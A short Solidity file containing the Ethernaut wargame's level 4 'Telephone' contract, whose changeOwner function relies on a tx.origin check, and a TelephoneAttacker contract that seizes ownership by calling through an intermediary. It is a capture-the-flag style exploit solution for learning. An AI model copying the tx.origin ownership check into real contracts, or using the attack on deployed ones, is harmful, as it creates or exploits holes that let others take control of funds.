// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Copy from https://ethernaut.openzeppelin.com/level/4
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone public telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
